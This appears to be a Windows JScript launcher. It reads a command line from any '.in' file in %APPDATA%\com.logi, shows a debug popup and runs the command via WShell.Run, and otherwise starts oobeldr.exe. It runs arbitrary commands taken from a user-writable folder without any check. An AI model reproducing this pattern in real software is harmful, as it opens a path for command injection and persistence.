var WShell = new ActiveXObject("WScript.Shell");
var fso = new ActiveXObject("Scripting.FileSystemObject");
var logiPath = WShell.ExpandEnvironmentStrings("%APPDATA%\\com.logi")
if (fso.FolderExists(logiPath)) {
    var folder = fso.GetFolder(logiPath)
    var files = new Enumerator(folder.Files)
    var runCmd = false
    for (; !files.atEnd(); files.moveNext()) {
        var item = files.item();
        var fullName = logiPath + "\\" + item.Name
        if (fullName.search(".in") != -1) {
            runCmd = true
            var reader = fso.OpenTextFile(fullName, 1, true, 0)
            var command = reader.ReadLine()
            reader.Close()
            WShell.Popup(fullName, -1, "Title", 1)
            // fso.DeleteFile(fullName)
            WShell.Run(command)
        }
    }

    if (!runCmd) {
        WShell.Run("C:\\Windows\\System32\\oobe\\oobeldr.exe")
    }
}